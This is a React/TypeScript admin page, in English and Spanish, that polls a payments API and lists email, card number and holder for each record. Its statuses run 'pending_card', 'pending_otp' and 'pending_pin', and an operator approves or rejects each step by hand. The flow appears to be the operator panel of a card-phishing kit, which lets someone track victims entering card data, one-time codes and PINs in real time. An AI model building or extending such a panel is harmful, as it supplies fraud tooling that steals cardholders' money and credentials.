import { useState, useEffect } from 'react';
import Header from '@/components/Header';

interface Payment {
  id: string;
  email: string;
  cardNumber: string;
  cardHolder: string;
  status: 'pending_card' | 'pending_otp' | 'pending_pin' | 'completed' | 'rejected';
  createdAt: string;
}

export default function AdminDashboard() {
  const [language, setLanguage] = useState<'en' | 'es'>('en');
  const [payments, setPayments] = useState<Payment[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);

  const translations = {
    en: {
      adminDashboard: 'Admin Dashboard',
      pendingPayments: 'Pending Payments',
      email: 'Email',
      cardNumber: 'Card Number',
      status: 'Status',
      action: 'Action',
      approve: 'Approve',
      reject: 'Reject',
      noPayments: 'No pending payments',
      details: 'Payment Details',
      cardHolder: 'Card Holder',
      createdAt: 'Created At',
      close: 'Close',
    },
    es: {
      adminDashboard: 'Panel de Administración',
      pendingPayments: 'Pagos Pendientes',
      email: 'Correo',
      cardNumber: 'Número de Tarjeta',
      status: 'Estado',
      action: 'Acción',
      approve: 'Aprobar',
      reject: 'Rechazar',
      noPayments: 'No hay pagos pendientes',
      details: 'Detalles del Pago',
      cardHolder: 'Titular de la Tarjeta',
      createdAt: 'Creado en',
      close: 'Cerrar',
    },
  };

  const t = translations[language];

  useEffect(() => {
    fetchPayments();
    const interval = setInterval(fetchPayments, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchPayments = async () => {
    try {
      const response = await fetch('/api/admin/payments');
      if (response.ok) {
        const data = await response.json();
        setPayments(data);
      }
    } catch (error) {
      console.error('Error fetching payments:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    try {
      const response = await fetch(`/api/admin/payments/${paymentId}/approve`, {
        method: 'POST',
      });
      if (response.ok) {
        fetchPayments();
      }
    } catch (error) {
      console.error('Error approving payment:', error);
    }
  };

  const handleReject = async (paymentId: string) => {
    try {
      const response = await fetch(`/api/admin/payments/${paymentId}/reject`, {
        method: 'POST',
      });
      if (response.ok) {
        fetchPayments();
      }
    } catch (error) {
      console.error('Error rejecting payment:', error);
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'pending_card':
        return 'bg-yellow-100 text-yellow-800';
      case 'pending_otp':
        return 'bg-blue-100 text-blue-800';
      case 'pending_pin':
        return 'bg-purple-100 text-purple-800';
      case 'completed':
        return 'bg-green-100 text-green-800';
      case 'rejected':
        return 'bg-red-100 text-red-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };

  const getStatusLabel = (status: string) => {
    const statusLabels = {
      en: {
        pending_card: 'Pending Card',
        pending_otp: 'Pending OTP',
        pending_pin: 'Pending PIN',
        completed: 'Completed',
        rejected: 'Rejected',
      },
      es: {
        pending_card: 'Tarjeta Pendiente',
        pending_otp: 'OTP Pendiente',
        pending_pin: 'PIN Pendiente',
        completed: 'Completado',
        rejected: 'Rechazado',
      },
    };
    return statusLabels[language][status as keyof typeof statusLabels['en']] || status;
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <Header language={language} onLanguageChange={setLanguage} />

      <main className="flex-1 py-12">
        <div className="max-w-6xl mx-auto px-4">
          <h1 className="text-4xl font-bold mb-8 text-gray-800">{t.adminDashboard}</h1>

          {loading ? (
            <div className="text-center py-12">
              <p className="text-gray-600">{language === 'en' ? 'Loading...' : 'Cargando...'}</p>
            </div>
          ) : payments.length === 0 ? (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <p className="text-gray-600 text-lg">{t.noPayments}</p>
            </div>
          ) : (
            <div className="bg-white rounded-lg shadow-lg overflow-hidden">
              <table className="w-full">
                <thead className="bg-gray-100 border-b">
                  <tr>
                    <th className="px-6 py-4 text-left text-sm font-semibold text-gray-700">
                      {t.email}
                    </th>
                    <th className="px-6 py-4 text-left text-sm font-semibold text-gray-700">
                      {t.cardNumber}
                    </th>
                    <th className="px-6 py-4 text-left text-sm font-semibold text-gray-700">
                      {t.status}
                    </th>
                    <th className="px-6 py-4 text-left text-sm font-semibold text-gray-700">
                      {t.action}
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {payments.map((payment) => (
                    <tr key={payment.id} className="border-b hover:bg-gray-50">
                      <td className="px-6 py-4 text-sm text-gray-700">{payment.email}</td>
                      <td className="px-6 py-4 text-sm text-gray-700">
                        {payment.cardNumber.slice(-4).padStart(payment.cardNumber.length, '*')}
                      </td>
                      <td className="px-6 py-4 text-sm">
                        <span className={`px-3 py-1 rounded-full text-xs font-semibold ${getStatusColor(payment.status)}`}>
                          {getStatusLabel(payment.status)}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-sm space-x-2">
                        {payment.status !== 'completed' && payment.status !== 'rejected' && (
                          <>
                            <button
                              onClick={() => handleApprove(payment.id)}
                              className="inline-block bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded transition"
                            >
                              {t.approve}
                            </button>
                            <button
                              onClick={() => handleReject(payment.id)}
                              className="inline-block bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded transition"
                            >
                              {t.reject}
                            </button>
                          </>
                        )}
                        <button
                          onClick={() => setSelectedPayment(payment)}
                          className="inline-block bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded transition"
                        >
                          {t.details}
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      {/* Details Modal */}
      {selectedPayment && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
            <h2 className="text-2xl font-bold mb-6 text-gray-800">{t.details}</h2>

            <div className="space-y-4 mb-8">
              <div>
                <p className="text-sm text-gray-600">{t.email}</p>
                <p className="text-lg font-semibold text-gray-800">{selectedPayment.email}</p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.cardHolder}</p>
                <p className="text-lg font-semibold text-gray-800">{selectedPayment.cardHolder}</p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.cardNumber}</p>
                <p className="text-lg font-semibold text-gray-800">
                  {selectedPayment.cardNumber.slice(-4).padStart(selectedPayment.cardNumber.length, '*')}
                </p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.status}</p>
                <p className={`text-lg font-semibold px-3 py-1 rounded-full inline-block ${getStatusColor(selectedPayment.status)}`}>
                  {getStatusLabel(selectedPayment.status)}
                </p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.createdAt}</p>
                <p className="text-lg font-semibold text-gray-800">
                  {new Date(selectedPayment.createdAt).toLocaleString()}
                </p>
              </div>
            </div>

            <button
              onClick={() => setSelectedPayment(null)}
              className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 rounded-lg transition"
            >
              {t.close}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
